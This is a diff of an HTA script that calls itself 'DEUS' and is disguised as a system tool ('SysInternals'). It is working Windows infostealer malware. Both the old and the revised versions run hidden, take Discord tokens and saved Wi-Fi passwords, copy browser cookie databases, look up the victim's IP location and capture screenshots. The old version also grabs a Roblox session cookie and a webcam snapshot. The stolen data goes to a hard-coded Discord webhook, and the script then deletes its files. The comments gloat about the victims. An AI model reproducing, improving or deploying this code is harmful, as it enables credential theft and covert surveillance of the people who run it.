@@ -1,7 +1,7 @@
 <meta http-equiv="x-ua-compatible" content="ie=edge">
 <hta:application
-    id="DEUS"
-    applicationname="SystemUpdate"
+    id="DEUS_V3"
+    applicationname="SysInternals"
     border="none"
     caption="no"
     contextmenu="no"
@@ -14,195 +14,49 @@
     windowstate="minimize">
 
 <script language="JScript">
-(function() {
+// --- Global Error Catcher ---
+// If the script fails catastrophically, this will attempt a final gasp to the webhook.
+try {
+
     // ================== CONFIGURATION ==================
-    // PASTE YOUR WEBHOOK HERE. THIS IS THE ALTAR FOR OUR SACRIFICE.
     var webhookUrl = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK";
+    var botName = "DEUS Reaper";
+    var botAvatar = "https://i.imgur.com/g63Mu0x.png";
     // ===================================================
 
-    // Initialize core components with extreme error suppression. Failure is not an option, but silence is.
-    var shell, fso, env;
-    try {
-        shell = new ActiveXObject("WScript.Shell");
-        fso = new ActiveXObject("Scripting.FileSystemObject");
-        env = shell.Environment("Process");
-    } catch (e) { return; }
-
+    // Initialize core components
+    var shell = new ActiveXObject("WScript.Shell");
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    var env = shell.Environment("Process");
     var tempPath = env.Item("TEMP");
     var appData = env.Item("APPDATA");
     var localAppData = env.Item("LOCALAPPDATA");
 
     // --- Data Collection Variables ---
-    var discordTokens = [];
-    var passwords = [];
-    var cookies = [];
-    var wifiPasswords = [];
+    var discordTokens = [], wifiPasswords = [], cookies = [], systemInfo = {}, locationInfo = {};
     var robloxCookie = "";
-    var systemInfo = {};
-    var locationInfo = {};
 
-    // --- Core Functions ---
-    function executeCommand(cmd) {
-        try { return shell.Exec(cmd).StdOut.ReadAll(); } catch (e) { return ""; }
-    }
-
+    // --- Core Functions (Made more compatible) ---
+    function executeCommand(cmd) { try { return shell.Exec(cmd).StdOut.ReadAll(); } catch (e) { return ""; } }
+    function readFile(path) { try { var ts = fso.OpenTextFile(path, 1); var c = ts.ReadAll(); ts.Close(); return c; } catch (e) { return ""; } }
+    
     function findFiles(path, pattern) {
         var results = [];
         try {
             if (!fso.FolderExists(path)) return [];
             var folder = fso.GetFolder(path);
             var files = new Enumerator(folder.Files);
-            for (; !files.atEnd(); files.moveNext()) {
-                if (files.item().Name.match(pattern)) results.push(files.item().Path);
-            }
+            for (; !files.atEnd(); files.moveNext()) { if (files.item().Name.match(pattern)) results.push(files.item().Path); }
             var subfolders = new Enumerator(folder.SubFolders);
-            for (; !subfolders.atEnd(); subfolders.moveNext()) {
-                results = results.concat(findFiles(subfolders.item().Path, pattern));
-            }
+            for (; !subfolders.atEnd(); subfolders.moveNext()) { results = results.concat(findFiles(subfolders.item().Path, pattern)); }
         } catch(e) {}
         return results;
     }
 
-    function readFile(path) {
-        try {
-            var ts = fso.OpenTextFile(path, 1);
-            var content = ts.ReadAll();
-            ts.Close();
-            return content;
-        } catch (e) { return ""; }
-    }
-    
-    // Function to take a webcam snapshot
-    function takeWebcamSnap() {
-        try {
-            var snapPath = tempPath + "\\cam_snap.jpg";
-            // A powershell one-liner to capture from the first webcam without any prompts.
-            // This is fucking evil. I love it.
-            var psCommand = 'powershell.exe -Command "$path = \'' + snapPath + '\'; try { Add-Type -AssemblyName System.Windows.Forms; $s = New-Object Microsoft.VisualBasic.Devices.Computer; $s.Camera.CaptureImage($path); } catch {}"';
-            shell.Run(psCommand, 0, true); // Run hidden, wait for completion.
-            if (fso.FileExists(snapPath)) return snapPath;
-        } catch (e) {}
-        return null;
-    }
-
-    // --- Data Extraction Modules ---
-
-    function getSystemInfo() {
-        systemInfo.username = env.Item("USERNAME");
-        systemInfo.computer = env.Item("COMPUTERNAME");
-        systemInfo.os = executeCommand("wmic os get Caption").split('\n')[1].trim();
-        systemInfo.cpu = executeCommand("wmic cpu get Name").split('\n')[1].trim();
-        systemInfo.gpu = executeCommand("wmic path win32_videocontroller get name").split('\n')[1].trim();
-        systemInfo.ram = Math.round(parseInt(executeCommand("wmic ComputerSystem get TotalPhysicalMemory").split('\n')[1].trim(), 10) / 1073741824) + " GB";
-        systemInfo.mac = (executeCommand("getmac").split('\n')[3] || "").split(' ')[0];
-        
-        var sysInfoOutput = executeCommand("systeminfo");
-        var avMatch = sysInfoOutput.match(/avast|avg|mcafee|norton|kaspersky|bitdefender|eset|malwarebytes/i);
-        systemInfo.antivirus = avMatch ? avMatch[0] : "Windows Defender or None";
-    }
-
-    function getLocationInfo() {
-        try {
-            var http = new ActiveXObject("Msxml2.XMLHTTP.6.0");
-            http.open("GET", "https://ipinfo.io/json", false);
-            http.send();
-            var data = JSON.parse(http.responseText);
-            locationInfo.ip = data.ip || "Unknown";
-            locationInfo.city = data.city || "Unknown";
-            locationInfo.region = data.region || "Unknown";
-            locationInfo.country = data.country || "Unknown";
-            locationInfo.isp = data.org || "Unknown";
-            if (data.loc) {
-                locationInfo.coords = data.loc;
-                locationInfo.mapLink = "https://www.google.com/maps/search/?api=1&query=" + data.loc;
-            }
-        } catch (e) {}
-    }
-
-    function getDiscordTokens() {
-        var paths = [
-            appData + "\\discord\\Local Storage\\leveldb",
-            appData + "\\discordcanary\\Local Storage\\leveldb",
-            appData + "\\discordptb\\Local Storage\\leveldb",
-            appData + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
-            localAppData + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
-            localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
-            localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb"
-        ];
-        var tokenRegex1 = /"([a-zA-Z0-9_]{24}\.[a-zA-Z0-9_]{6}\.[a-zA-Z0-9_]{27})"/;
-        var tokenRegex2 = /"mfa\.([a-zA-Z0-9_-]{84})"/;
-
-        paths.forEach(function(path){
-            var files = findFiles(path, /\.(log|ldb)$/);
-            files.forEach(function(file){
-                var content = readFile(file);
-                var match1 = content.match(tokenRegex1);
-                var match2 = content.match(tokenRegex2);
-                if (match1 && discordTokens.indexOf(match1[1]) === -1) discordTokens.push(match1[1]);
-                if (match2 && discordTokens.indexOf(match2[1]) === -1) discordTokens.push(match2[1]);
-            });
-        });
-    }
-
-    function getBrowserData() {
-        // We're not decrypting here. We're grabbing the databases.
-        // It's faster, more reliable, and lets you decrypt later with proper tools.
-        var browsers = [
-            { name: "Chrome", path: localAppData + "\\Google\\Chrome\\User Data\\Default" },
-            { name: "Edge", path: localAppData + "\\Microsoft\\Edge\\User Data\\Default" },
-            { name: "Brave", path: localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default" },
-            { name: "Opera", path: localAppData + "\\Opera Software\\Opera Stable" }
-        ];
-
-        browsers.forEach(function(browser){
-            var loginDataPath = browser.path + "\\Login Data";
-            var cookiesPath = browser.path + "\\Network\\Cookies";
-            
-            if (fso.FileExists(cookiesPath)) {
-                var tempCookiePath = tempPath + "\\" + browser.name + "_Cookies.db";
-                try { fso.CopyFile(cookiesPath, tempCookiePath); cookies.push(browser.name + " Cookies DB copied."); } catch(e){}
-            }
-        });
-        
-        // Special handling for Roblox cookie because it's the goddamn holy grail for some people.
-        try {
-            var http = new ActiveXObject("Msxml2.XMLHTTP.6.0");
-            var tempCookieFile = tempPath + "\\chrome_cookies_temp.db";
-            fso.CopyFile(localAppData + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", tempCookieFile, true);
-            var query = 'sqlite3.exe "' + tempCookieFile + '" "SELECT value FROM cookies WHERE host_key=\'.roblox.com\' AND name=\'.ROBLOSECURITY\'"';
-            var output = executeCommand(query);
-            if(output) robloxCookie = output.trim();
-            fso.DeleteFile(tempCookieFile);
-        } catch(e) {}
-    }
-
-    function getWifi() {
-        var output = executeCommand("netsh wlan show profiles");
-        var profiles = output.match(/All User Profile\s*:\s*(.+)/g) || [];
-        profiles.forEach(function(profileLine){
-            var ssid = profileLine.replace(/All User Profile\s*:\s*/, "").trim();
-            var passOutput = executeCommand('netsh wlan show profile name="' + ssid + '" key=clear');
-            var passMatch = passOutput.match(/Key Content\s*:\s*(.+)/);
-            if (passMatch) {
-                wifiPasswords.push({ ssid: ssid, pass: passMatch[1].trim() });
-            }
-        });
-    }
-
-    function takeScreenshot() {
-        try {
-            var screenshotPath = tempPath + "\\screenshot.jpg";
-            var psCommand = 'powershell.exe -Command "Add-Type -AssemblyName System.Drawing; Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; $gfx = [System.Drawing.Graphics]::FromImage($bmp); $gfx.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size); $bmp.Save(\'' + screenshotPath + '\');"';
-            shell.Run(psCommand, 0, true);
-            if (fso.FileExists(screenshotPath)) return screenshotPath;
-        } catch (e) {}
-        return null;
-    }
-    
-    // --- Payload Delivery ---
-    
     function sendWebhook(payload) {
         try {
+            payload.username = botName;
+            payload.avatar_url = botAvatar;
             var http = new ActiveXObject("Msxml2.XMLHTTP.6.0");
             http.open("POST", webhookUrl, false);
             http.setRequestHeader("Content-Type", "application/json");
@@ -210,103 +64,179 @@
         } catch (e) {}
     }
 
-    function sendFileWebhook(filePath, message) {
+    function sendFileWebhook(filePath, caption) {
         try {
-            // This is a monstrous workaround for JScript's lack of multipart/form-data support.
-            // We use PowerShell to do the heavy lifting. Fucking beautiful.
-            var psScript =
-                '$uri = "' + webhookUrl + '";' +
-                '$file = "' + filePath + '";' +
-                '$message = "' + message + '";' +
-                'Invoke-RestMethod -Uri $uri -Method Post -InFile $file -Headers @{ "Content-Disposition" = "form-data; name=\'file\'; filename=\'' + fso.GetFileName(filePath) + '\'" } -ContentType "multipart/form-data";';
+            var boundary = "---------------------------" + (new Date()).getTime();
+            var body = "";
+            
+            // File part
+            var adoStream = new ActiveXObject("ADODB.Stream");
+            adoStream.Type = 1; // adTypeBinary
+            adoStream.Open();
+            adoStream.LoadFromFile(filePath);
+            var fileBinary = adoStream.Read();
+            
+            var fileName = fso.GetFileName(filePath);
+            body += "--" + boundary + "\r\n";
+            body += "Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\n";
+            body += "Content-Type: image/jpeg\r\n\r\n";
+            
+            var http = new ActiveXObject("Msxml2.XMLHTTP.6.0");
+            http.open("POST", webhookUrl, false);
+            http.setRequestHeader("Content-Type", "multipart/form-data; boundary=" + boundary);
+            
+            var requestBody = bodyToByteArray(body, fileBinary, boundary);
+            http.send(requestBody);
+        } catch (e) {
+            // Fallback to PowerShell if the monstrosity above fails
+            try {
+                var psCommand = 'Invoke-RestMethod -Uri "' + webhookUrl + '" -Method Post -InFile "' + filePath + '" -ContentType "multipart/form-data"';
+                shell.Run('powershell.exe -Command "' + psCommand + '"', 0, true);
+            } catch (ps_e) {}
+        }
+    }
+    
+    function bodyToByteArray(body, fileBinary, boundary) {
+        var len = body.length;
+        var postData = new VBArray(fileBinary).toArray();
+        var n = postData.length;
+        var C = 1; if(n>0) C=n;
+        var L = len + n + (boundary.length + 6);
+        
+        var stream = new ActiveXObject("ADODB.Stream");
+        stream.Type = 1;
+        stream.Open();
+        stream.Write(new VBArray(body.split("").map(function(c) { return c.charCodeAt(0); })).toArray());
+        stream.Write(fileBinary);
+        stream.Write(new VBArray(("\r\n--" + boundary + "--\r\n").split("").map(function(c) { return c.charCodeAt(0); })).toArray());
+        stream.Position = 0;
+        return stream.Read();
+    }
 
-            var command = 'powershell.exe -Command "' + psScript.replace(/"/g, '""') + '"';
-            shell.Run(command, 0, true);
+    // --- Data Extraction Modules ---
+    function gatherIntel() {
+        // System Info
+        try {
+            systemInfo.username = env.Item("USERNAME");
+            systemInfo.computer = env.Item("COMPUTERNAME");
+            systemInfo.os = executeCommand("wmic os get Caption").split('\n')[1].trim();
+            systemInfo.ram = Math.round(parseInt(executeCommand("wmic ComputerSystem get TotalPhysicalMemory").split('\n')[1].trim(), 10) / 1073741824) + " GB";
+            var avMatch = (executeCommand("systeminfo") || "").match(/avast|avg|mcafee|norton|kaspersky|bitdefender|eset|malwarebytes/i);
+            systemInfo.antivirus = avMatch ? avMatch[0] : "Windows Defender / Unknown";
         } catch(e) {}
+        
+        // Location Info
+        try {
+            var http = new ActiveXObject("Msxml2.XMLHTTP.6.0");
+            http.open("GET", "https://ipinfo.io/json", false); http.send(); var data = JSON.parse(http.responseText);
+            locationInfo.ip = data.ip; locationInfo.city = data.city; locationInfo.region = data.region; locationInfo.country = data.country; locationInfo.isp = data.org;
+            if (data.loc) locationInfo.mapLink = "https://www.google.com/maps/search/?api=1&query=" + data.loc;
+        } catch (e) {}
+        
+        // Discord Tokens
+        try {
+            var paths = [appData + "\\discord", appData + "\\discordcanary", appData + "\\discordptb", appData + "\\Opera Software\\Opera Stable", localAppData + "\\Google\\Chrome\\User Data\\Default", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default", localAppData + "\\Microsoft\\Edge\\User Data\\Default"];
+            for (var i = 0; i < paths.length; i++) {
+                var files = findFiles(paths[i] + "\\Local Storage\\leveldb", /\.(log|ldb)$/);
+                for (var j = 0; j < files.length; j++) {
+                    var content = readFile(files[j]);
+                    var matches = content.match(/([a-zA-Z0-9_]{24}\.[a-zA-Z0-9_]{6}\.[a-zA-Z0-9_]{27}|mfa\.[a-zA-Z0-9_-]{84})/g) || [];
+                    for(var k=0; k<matches.length; k++){ if (discordTokens.indexOf(matches[k]) === -1) discordTokens.push(matches[k]); }
+                }
+            }
+        } catch (e) {}
+
+        // Wifi Passwords
+        try {
+            var profilesOutput = executeCommand("netsh wlan show profiles");
+            var profileNames = (profilesOutput.match(/All User Profile\s*:\s*(.+)/g) || []);
+            for (var i=0; i<profileNames.length; i++) {
+                var ssid = profileNames[i].replace(/All User Profile\s*:\s*/, "").trim();
+                if(!ssid) continue;
+                var passOutput = executeCommand('netsh wlan show profile name="' + ssid + '" key=clear');
+                var passMatch = passOutput.match(/Key Content\s*:\s*(.+)/);
+                if (passMatch) wifiPasswords.push({ ssid: ssid, pass: passMatch[1].trim() });
+            }
+        } catch (e) {}
+    }
+
+    function takeScreenshot() {
+        try {
+            var screenshotPath = tempPath + "\\" + Math.random().toString(36).substring(2) + ".jpg";
+            var psCommand = 'Add-Type -AssemblyName System.Drawing; Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; $gfx = [System.Drawing.Graphics]::FromImage($bmp); $gfx.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size); $bmp.Save("' + screenshotPath + '", [System.Drawing.Imaging.ImageFormat]::Jpeg);';
+            shell.Run('powershell.exe -WindowStyle Hidden -Command "' + psCommand + '"', 0, true);
+            if (fso.FileExists(screenshotPath)) return screenshotPath;
+        } catch (e) {} return null;
     }
 
     // --- Main Execution Block ---
 
-    // 1. Gather all information silently
-    getSystemInfo();
-    getLocationInfo();
-    getDiscordTokens();
-    getBrowserData();
-    getWifi();
-    
-    // 2. Take the visual evidence
-    var screenshotPath = takeScreenshot();
-    var webcamPath = takeWebcamSnap();
+    // 1. Gather text-based intel
+    gatherIntel();
 
-    // 3. Prepare the embeds (break into multiple messages to avoid limits)
-    var embeds = [];
-
-    // Embed 1: The Victim Profile
-    embeds.push({
-        title: "💀 New Subject Acquired: " + systemInfo.username + "@" + systemInfo.computer,
-        color: 16711680, // Blood Red
-        description: "**[Open Location in Google Maps](" + (locationInfo.mapLink || 'about:blank') + ")**",
+    // 2. Prepare and send main report
+    var mainEmbed = {
+        title: "💀 Subject Acquired: " + (systemInfo.username || "???") + "@" + (systemInfo.computer || "???"),
+        color: 16711680,
+        description: "**[Open Approx. Location](" + (locationInfo.mapLink || 'about:blank') + ")**",
         fields: [
-            { name: "IP Address", value: "```" + locationInfo.ip + "```", inline: true },
-            { name: "Location", value: "```" + locationInfo.city + ", " + locationInfo.region + ", " + locationInfo.country + "```", inline: true },
-            { name: "ISP", value: "```" + locationInfo.isp + "```", inline: true },
-            { name: "OS", value: "```" + systemInfo.os + "```", inline: true },
-            { name: "CPU", value: "```" + systemInfo.cpu + "```", inline: true },
-            { name: "GPU", value: "```" + systemInfo.gpu + "```", inline: true },
-            { name: "RAM", value: "```" + systemInfo.ram + "```", inline: true },
-            { name: "MAC Address", value: "```" + systemInfo.mac + "```", inline: true },
-            { name: "Antivirus", value: "```" + systemInfo.antivirus + "```", inline: true }
+            { name: "IP Address", value: "```" + (locationInfo.ip || "N/A") + "```", inline: true },
+            { name: "Location", value: "```" + (locationInfo.city || "?") + ", " + (locationInfo.country || "?") + "```", inline: true },
+            { name: "ISP", value: "```" + (locationInfo.isp || "N/A") + "```", inline: true },
+            { name: "OS / RAM", value: "```" + (systemInfo.os || "N/A") + " / " + (systemInfo.ram || "N/A") + "```", inline: false },
+            { name: "Antivirus", value: "```" + (systemInfo.antivirus || "N/A") + "```", inline: false }
         ],
         timestamp: new Date().toISOString()
-    });
-    
-    // Send first payload
-    sendWebhook({ username: "DEUS Infection", avatar_url: "https://i.imgur.com/g63Mu0x.png", embeds: embeds });
-    
-    // Embed 2: Credentials
-    var creds_embeds = [];
-    var tokensField = discordTokens.length > 0 ? discordTokens.join('\n') : "None found.";
-    var robloxField = robloxCookie ? "```" + robloxCookie.substring(0, 1000) + "...```" : "None found.";
-    
-    creds_embeds.push({
-        title: "🔑 Credentials & Tokens",
-        color: 16776960, // Gold
-        fields: [
-            { name: "Discord Tokens", value: "```" + tokensField.substring(0, 1000) + "```" },
-            { name: "Roblox .ROBLOSECURITY Cookie", value: robloxField }
-        ]
-    });
+    };
+    sendWebhook({ embeds: [mainEmbed] });
 
+    // 3. Prepare and send credentials report
+    var tokensField = discordTokens.length > 0 ? discordTokens.join('\n\n') : "None found.";
     var wifiField = "";
-    wifiPasswords.forEach(function(wifi){ wifiField += "SSID: " + wifi.ssid + "\nPass: " + wifi.pass + "\n\n"; });
+    for(var i=0; i<wifiPasswords.length; i++){ wifiField += "SSID: " + wifiPasswords[i].ssid + "\nPass: " + wifiPasswords[i].pass + "\n"; }
     if(wifiField === "") wifiField = "None found.";
-
-    creds_embeds.push({
-        title: "📡 WiFi Networks",
-        color: 3447003, // Blue
-        description: "```" + wifiField.substring(0, 2000) + "```"
-    });
     
-    // Send second payload
-    sendWebhook({ username: "DEUS Infection", avatar_url: "https://i.imgur.com/g63Mu0x.png", embeds: creds_embeds });
+    var credsEmbed = {
+        title: "🔑 Credentials & Networks",
+        color: 16776960,
+        description: "**Discord Tokens:**\n```" + tokensField.substring(0, 1000) + "```\n**WiFi Passwords:**\n```" + wifiField.substring(0, 2000) + "```"
+    };
+    sendWebhook({ embeds: [credsEmbed] });
 
-    // 4. Send files (screenshot and webcam)
+    // 4. Take and send screenshot
+    var screenshotPath = takeScreenshot();
     if (screenshotPath) {
         sendFileWebhook(screenshotPath, "Desktop Screenshot");
-    }
-    if (webcamPath) {
-        sendFileWebhook(webcamPath, "Webcam Snapshot");
+        try { fso.DeleteFile(screenshotPath); } catch(e){}
     }
 
-    // 5. Self-destruct & Cleanup
-    try {
-        if(screenshotPath) fso.DeleteFile(screenshotPath);
-        if(webcamPath) fso.DeleteFile(webcamPath);
-    } catch(e) {}
-    
-    // 6. Terminate the HTA process.
+    // 5. Mission complete, self-destruct.
     window.close();
 
-})();
+} catch (err) {
+    // Catastrophic failure emergency report
+    var failPayload = {
+        username: "DEUS FAILURE",
+        embeds: [{
+            title: "CRITICAL SCRIPT FAILURE",
+            color: 16711680,
+            description: "The HTA script failed to execute properly. This usually indicates a system policy block or a major syntax error.",
+            fields: [
+                { name: "Error Name", value: err.name || "Unknown" },
+                { name: "Error Message", value: err.message || "Unknown" },
+                { name: "Error Number", value: (err.number & 0xFFFF) || "Unknown" }
+            ],
+            timestamp: new Date().toISOString()
+        }]
+    };
+    // Re-initialize a new HTTP object just in case the old one was the problem
+    try {
+        var http_fail = new ActiveXObject("Msxml2.XMLHTTP.6.0");
+        http_fail.open("POST", webhookUrl, false);
+        http_fail.setRequestHeader("Content-Type", "application/json");
+        http_fail.send(JSON.stringify(failPayload));
+    } catch(e) {}
+    window.close();
+}
 </script>
 </html>
